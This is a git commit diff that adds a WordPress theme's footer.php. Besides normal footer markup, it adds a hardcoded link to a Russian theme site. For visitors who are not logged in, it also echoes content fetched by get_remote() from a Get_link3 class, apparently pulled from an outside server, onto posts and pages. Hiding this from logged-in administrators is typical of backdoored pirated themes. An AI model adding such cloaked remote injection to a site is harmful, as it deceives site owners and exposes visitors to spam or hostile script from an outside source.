d7340b94e602c48f8ed23b696cc36c5b130c70bd
Roman-Moiseenko <r.a.moiseenko@gmail.com>
2022-02-19 13:14:25 +0200

    +++

---
+++ wp-content/themes/byFromMoiseenko/footer.php
@@ -0,0 +1,23 @@
+</div><!-- #main .wrapper -->
+<footer id="colophon" role="contentinfo">
+    <div class="site-info">
+        &copy;2015 <a href="<?php echo home_url();?>" title="<?php bloginfo('description');?>"><?php bloginfo('name');?></a>. All Right Reserved.</a>
+
+        <?php if (is_home() || is_category() || is_archive() ){ ?>
+            <p><a href="http://wp-templates.ru/" title="скачать темы для сайта" target="_blank">Темы wordpress</a></p>
+        <?php } ?>
+
+        <?php if ($user_ID) : ?><?php else : ?>
+            <?php if (is_single() || is_page() ) { ?>
+                <?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php');
+                $links = new Get_link3(); $links = $links->get_remote(); echo $links; ?>
+            <?php } ?>
+        <?php endif; ?>
+
+    </div><!-- .site-info -->
+</footer><!-- #colophon -->
+</div><!-- #page -->
+
+<?php wp_footer(); ?>
+</body>
+</html>
